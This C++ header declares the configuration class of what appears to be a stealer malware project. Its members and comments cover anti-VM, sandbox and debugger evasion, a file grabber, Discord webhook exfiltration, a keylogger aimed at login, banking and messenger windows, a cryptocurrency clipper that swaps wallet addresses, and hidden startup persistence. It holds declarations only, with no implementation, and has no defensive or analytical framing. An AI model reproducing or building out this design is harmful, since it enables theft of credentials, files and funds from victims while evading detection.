#pragma once
#include <string>
#include <unordered_map>

class Config
{
public:

    enum class FileType {
        Document,
        DataBase,
        SourceCode,
        Image
    };

    static std::unordered_map<FileType, std::vector<std::string>> GrabberFileTypes_unordered_map;
    const  static std::string Version;
    // Debug mode (write all exceptions to file)
    //static std::string DebugMode;
    // Application mutex (random)
    //static std::string Mutex;
    // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
    static std::string AntiAnalysis;
    // Random start delay (0-10 seconds)
    static std::string StartDelay;
    static std::string GrabberModule;
    static std::string Webhook;
    // Discord Webhook bot avatar
    static std::string Avatar;
    // Discord Webhook bot username
    static std::string Username;
    // Maximum file size
    static int GrabberSizeLimit;
    // Decrypt config values
    static void Init();
    static std::vector<std::string> KeyloggerServices;
    static std::vector<std::string> BankingServices;
    // Start clipper when active window title contains this text:
    static std::vector<std::string> CryptoServices;
    // Drop and Hide executable to startup directory
    static std::string Autorun;
    // Run keylogger when user opened log-in form, banking service or messenger
    static std::string KeyloggerModule;
    // Clipper addresses:
    static std::unordered_map<std::string, std::string> ClipperAddresses;
    // Start keylogger when active window title contains this text:
    // Run clipper when user opened cryptocurrency application
    static std::string ClipperModule;
};

